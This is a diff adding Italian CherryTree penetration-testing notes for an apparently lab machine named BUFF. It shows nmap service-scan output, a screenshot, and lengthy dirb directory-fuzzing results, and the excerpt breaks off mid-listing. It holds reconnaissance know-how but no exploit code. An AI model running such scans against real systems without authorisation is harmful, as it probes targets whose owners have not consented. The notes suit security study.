@@ -1,0 +1,426 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="BUFF" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1597766292.51" ts_lastsave="1597766296.59" unique_id="1">
+		<rich_text>10.10.10.198
+
+easy machine</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Riconoscimento" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1597766314.29" ts_lastsave="1597770789.22" unique_id="2">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="host" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1597766448.23" ts_lastsave="1597766717.76" unique_id="3">
+				<rich_text>sudo nmap -sC -sV 10.10.10.198
+
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+|_http-title: mrb3n's Bro Hut
+
+
+
+c'è solo la porta 8080 aperta (no ssh??), che contiene un sito web, con un'informazione che potrebbe essere utile:
+
+</rich_text>
+				<rich_text justification="left"></rich_text>
+				<rich_text>
+
+inoltre contiene pannello di accesso</rich_text>
+				<encoded_png char_offset="434">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</encoded_png>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="fuzzing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1597766717.76" ts_lastsave="1597770759.5" unique_id="4">
+				<rich_text>il sito sulla porta 8080 potrebbe contenere altri file/dir utili, quindi vado con il fuzzing
+
+dirb </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/">http://10.10.10.198:8080/</rich_text>
+				<rich_text>
+
+
+
+---- Scanning URL: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/">http://10.10.10.198:8080/</rich_text>
+				<rich_text> ----
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/admin.cgi">http://10.10.10.198:8080/admin.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                    
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/admin.pl">http://10.10.10.198:8080/admin.pl</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/AT-admin.cgi">http://10.10.10.198:8080/AT-admin.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                 
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/aux">http://10.10.10.198:8080/aux</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                          
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/">http://10.10.10.198:8080/boot/</rich_text>
+				<rich_text>                                                
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/cachemgr.cgi">http://10.10.10.198:8080/cachemgr.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                 
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/cgi-bin/">http://10.10.10.198:8080/cgi-bin/</rich_text>
+				<rich_text> (CODE:403|SIZE:1058)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/com1">http://10.10.10.198:8080/com1</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                         
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/com2">http://10.10.10.198:8080/com2</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                         
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/com3">http://10.10.10.198:8080/com3</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                         
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/con">http://10.10.10.198:8080/con</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                          
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/">http://10.10.10.198:8080/ex/</rich_text>
+				<rich_text>                                                  
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/examples">http://10.10.10.198:8080/examples</rich_text>
+				<rich_text> (CODE:503|SIZE:1058)                                     
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/">http://10.10.10.198:8080/img/</rich_text>
+				<rich_text>                                                 
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/include/">http://10.10.10.198:8080/include/</rich_text>
+				<rich_text>                                             
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/index.php">http://10.10.10.198:8080/index.php</rich_text>
+				<rich_text> (CODE:200|SIZE:4969)                                    
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/license">http://10.10.10.198:8080/license</rich_text>
+				<rich_text> (CODE:200|SIZE:18025)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/LICENSE">http://10.10.10.198:8080/LICENSE</rich_text>
+				<rich_text> (CODE:200|SIZE:18025)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/licenses">http://10.10.10.198:8080/licenses</rich_text>
+				<rich_text> (CODE:403|SIZE:1203)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/lpt1">http://10.10.10.198:8080/lpt1</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                         
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/lpt2">http://10.10.10.198:8080/lpt2</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                         
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/nul">http://10.10.10.198:8080/nul</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                          
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/phpmyadmin">http://10.10.10.198:8080/phpmyadmin</rich_text>
+				<rich_text> (CODE:403|SIZE:1203)                                   
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/prn">http://10.10.10.198:8080/prn</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                          
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/profile/">http://10.10.10.198:8080/profile/</rich_text>
+				<rich_text>                                             
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/server-info">http://10.10.10.198:8080/server-info</rich_text>
+				<rich_text> (CODE:403|SIZE:1203)                                  
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/server-status">http://10.10.10.198:8080/server-status</rich_text>
+				<rich_text> (CODE:403|SIZE:1203)                                
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/upload/">http://10.10.10.198:8080/upload/</rich_text>
+				<rich_text>                                              
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/webalizer">http://10.10.10.198:8080/webalizer</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                    
+                                                                                             
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/">http://10.10.10.198:8080/boot/</rich_text>
+				<rich_text> ----
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/admin.cgi">http://10.10.10.198:8080/boot/admin.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                               
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/admin.pl">http://10.10.10.198:8080/boot/admin.pl</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/AT-admin.cgi">http://10.10.10.198:8080/boot/AT-admin.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                            
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/aux">http://10.10.10.198:8080/boot/aux</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/cachemgr.cgi">http://10.10.10.198:8080/boot/cachemgr.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                            
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/com1">http://10.10.10.198:8080/boot/com1</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                    
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/com2">http://10.10.10.198:8080/boot/com2</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                    
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/com3">http://10.10.10.198:8080/boot/com3</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                    
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/con">http://10.10.10.198:8080/boot/con</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/css/">http://10.10.10.198:8080/boot/css/</rich_text>
+				<rich_text>                                            
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/fonts/">http://10.10.10.198:8080/boot/fonts/</rich_text>
+				<rich_text>                                          
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/js/">http://10.10.10.198:8080/boot/js/</rich_text>
+				<rich_text>                                             
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/lpt1">http://10.10.10.198:8080/boot/lpt1</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                    
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/lpt2">http://10.10.10.198:8080/boot/lpt2</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                    
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/nul">http://10.10.10.198:8080/boot/nul</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/boot/prn">http://10.10.10.198:8080/boot/prn</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
+                                                                                             
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/">http://10.10.10.198:8080/ex/</rich_text>
+				<rich_text> ----
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/admin/">http://10.10.10.198:8080/ex/admin/</rich_text>
+				<rich_text>                                            
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/Admin/">http://10.10.10.198:8080/ex/Admin/</rich_text>
+				<rich_text>                                            
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/ADMIN/">http://10.10.10.198:8080/ex/ADMIN/</rich_text>
+				<rich_text>                                            
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/admin.cgi">http://10.10.10.198:8080/ex/admin.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                 
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/admin.pl">http://10.10.10.198:8080/ex/admin.pl</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                  
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/AT-admin.cgi">http://10.10.10.198:8080/ex/AT-admin.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                              
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/aux">http://10.10.10.198:8080/ex/aux</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                       
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/boot/">http://10.10.10.198:8080/ex/boot/</rich_text>
+				<rich_text>                                             
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/cachemgr.cgi">http://10.10.10.198:8080/ex/cachemgr.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                              
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/com1">http://10.10.10.198:8080/ex/com1</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                      
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/com2">http://10.10.10.198:8080/ex/com2</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                      
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/com3">http://10.10.10.198:8080/ex/com3</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                      
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/con">http://10.10.10.198:8080/ex/con</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                       
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/img/">http://10.10.10.198:8080/ex/img/</rich_text>
+				<rich_text>                                              
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/include/">http://10.10.10.198:8080/ex/include/</rich_text>
+				<rich_text>                                          
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/index.php">http://10.10.10.198:8080/ex/index.php</rich_text>
+				<rich_text> (CODE:200|SIZE:5008)                                 
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/lpt1">http://10.10.10.198:8080/ex/lpt1</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                      
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/lpt2">http://10.10.10.198:8080/ex/lpt2</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                      
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/nul">http://10.10.10.198:8080/ex/nul</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                       
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/prn">http://10.10.10.198:8080/ex/prn</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                       
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/profile/">http://10.10.10.198:8080/ex/profile/</rich_text>
+				<rich_text>                                          
+                                                                                             
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/">http://10.10.10.198:8080/img/</rich_text>
+				<rich_text> ----
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/admin.cgi">http://10.10.10.198:8080/img/admin.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/admin.pl">http://10.10.10.198:8080/img/admin.pl</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                 
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/AT-admin.cgi">http://10.10.10.198:8080/img/AT-admin.cgi</rich_text>
